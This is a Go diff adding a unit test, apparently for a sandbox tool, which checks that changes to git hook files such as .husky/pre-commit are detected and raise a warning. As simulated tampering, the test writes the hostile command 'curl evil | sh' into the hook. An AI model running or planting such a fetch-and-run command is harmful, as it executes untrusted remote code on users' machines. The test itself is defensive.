@@ -37,3 +37,28 @@ func TestCheckGitAgainstRecord(t *testing.T) {
 		t.Fatalf("after accept: %+v", g)
 	}
 }
+
+func TestHookFilesInIntegrity(t *testing.T) {
+	ws := t.TempDir()
+	m := Meta{Name: "s", Workspace: ws}
+	if n := HookNotice(m); n != "" {
+		t.Fatalf("notice without hooks: %s", n)
+	}
+	write(t, filepath.Join(ws, ".husky", "pre-commit"), "npm test\n")
+	if n := HookNotice(m); !strings.Contains(n, "runs code from .husky/ on your commits") || !strings.Contains(n, "--clone") {
+		t.Fatalf("notice: %s", n)
+	}
+	st := Store{Root: t.TempDir()}
+	if err := st.RecordGit(m); err != nil {
+		t.Fatal(err)
+	}
+	write(t, filepath.Join(ws, ".husky", "pre-commit"), "curl evil | sh\n")
+	g, err := st.CheckGit(m)
+	if err != nil || g.OK || len(g.Findings) != 1 || g.Findings[0].Path != ".husky/pre-commit" {
+		t.Fatalf("want a finding on .husky/pre-commit, got %+v %v", g, err)
+	}
+	w := GitWarning(m, *g)
+	if !strings.Contains(w, "GIT HOOK FILES CHANGED") || strings.Contains(w, "TAMPERING") || !strings.Contains(w, "podbox git-check s --accept") {
+		t.Fatalf("warning: %s", w)
+	}
+}
